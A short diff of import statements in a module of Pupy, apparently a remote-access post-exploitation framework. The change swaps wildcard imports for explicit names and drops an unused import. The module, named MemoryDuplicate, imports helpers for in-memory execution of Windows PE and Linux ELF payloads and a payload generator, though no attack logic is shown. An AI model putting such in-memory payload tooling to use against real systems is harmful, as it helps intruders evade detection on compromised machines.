@@ -1,12 +1,10 @@
 # -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
-from pupylib.PupyModule import *
-from pupylib.PupyCompleter import *
-from pupylib.PupyErrors import PupyModuleError
+
+from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from modules.lib.windows.memory_exec import exec_pe
 from modules.lib.linux.exec_elf import mexec
-import time
 import pupygen
 
 __class_name__="MemoryDuplicate"
